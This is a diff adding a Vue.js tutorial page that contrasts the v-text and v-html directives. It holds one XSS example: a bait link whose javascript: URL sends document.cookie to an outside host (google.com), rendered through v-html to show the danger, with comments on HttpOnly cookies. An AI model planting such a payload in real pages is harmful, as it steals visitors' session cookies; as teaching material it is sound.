@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <title>內建指令</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+
+<body>
+    <div id="root">
+        <div v-text="str">不會出現</div>
+        <div v-html="str2"></div>
+    </div>
+    <script type="text/javascript">
+        Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示。
+        const vm = new Vue({
+            el: '#root',
+            data: {
+                str: '<h3>你好</h3>',
+                str2: '<a href=javascript:location.href="https://google.com?"+document.cookie>引誘點擊的文字</a>',
+            }
+        })
+        // https://www.bilibili.com/video/BV1Zy4y1K7SH?p=41
+        // Cookie Editor
+        // document.cookie
+        // google java web cookie set httponly
+    </script>
+</body>
+
+</html>
